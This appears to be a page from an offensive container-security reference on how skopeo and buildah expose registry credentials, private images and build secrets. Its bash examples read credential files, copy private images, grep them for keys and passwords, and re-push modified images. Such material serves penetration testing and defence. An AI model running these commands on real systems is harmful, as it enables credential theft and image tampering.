---
title: "skopeo and buildah: image transport and build tooling exposure"
description: "skopeo moves and inspects images between registries and local storage, and buildah builds images without a daemon. Both read the same registry credentials Podman uses and both touch registry content and build inputs, so they expose stored credentials, allow inspecting and copying private images, and carry the build-time secret and context risks of any image builder."
keywords:
  - skopeo
  - buildah
  - registry credentials
  - image inspect
  - build secrets
---

# skopeo and buildah

`skopeo` and `buildah` are the Podman ecosystem's image tools: skopeo inspects and copies images between registries and local stores without pulling them into a runtime, and buildah builds images without a daemon. Both authenticate to registries using the same stored credentials as Podman, and both handle registry content and build inputs, so they expose two things to an attacker who can run them: the cached registry credentials, and the ability to inspect, copy, and build private images.

## Credential and image exposure with skopeo

```bash
# skopeo reads the same auth file Podman/Docker write
cat /run/user/$(id -u)/containers/auth.json ~/.docker/config.json 2>/dev/null
# inspect a private image's config and layers without pulling it
skopeo inspect --config docker://<registry>/<private-repo>:<tag>
# copy a private image out for offline layer mining
skopeo copy docker://<registry>/<private-repo>:<tag> dir:/tmp/img
grep -rIE 'AKIA|PRIVATE KEY|password' /tmp/img 2>/dev/null
# re-push a modified image (if the credential has write scope)
skopeo copy dir:/tmp/img docker://<registry>/<private-repo>:<tag>
```

skopeo's `inspect` and `copy` reach registry content with whatever the stored credential allows, so a readable `auth.json` becomes private-image access and, with write scope, a push.

## Build exposure with buildah

```bash
# buildah builds carry the same build-arg and context risks as docker build
buildah bud --build-arg TOKEN=... -t img .            # TOKEN persists in history
buildah inspect img | jq '.OCIv1.history'             # recover baked build args
# buildah runs build steps as the invoking user (rootless) or root
```

## Exploitation notes

- The shared `auth.json` is the pivot: it holds base64 registry credentials that skopeo uses, so reading it yields private-registry access without any registry-side attack.
- skopeo `copy` to a local `dir:` or `oci:` layout is the clean way to pull a private image for [layer secret mining](../docker/images-and-registries/secrets-in-image-layers.md) without a runtime.
- buildah builds have the same build-arg leak and context-handling exposure as Docker builds; see [Build-arg secret leak](../docker/build-time/build-arg-secret-leak.md) and [BuildKit RCE](../docker/build-time/buildkit-rce.md) for the equivalent risks.

## Tools

- [skopeo](https://github.com/containers/skopeo)
- [buildah](https://github.com/containers/buildah)

## References

- [skopeo documentation](https://github.com/containers/skopeo/blob/main/docs/skopeo.1.md)
- [buildah documentation](https://docs.podman.io/en/latest/markdown/podman-build.1.html)
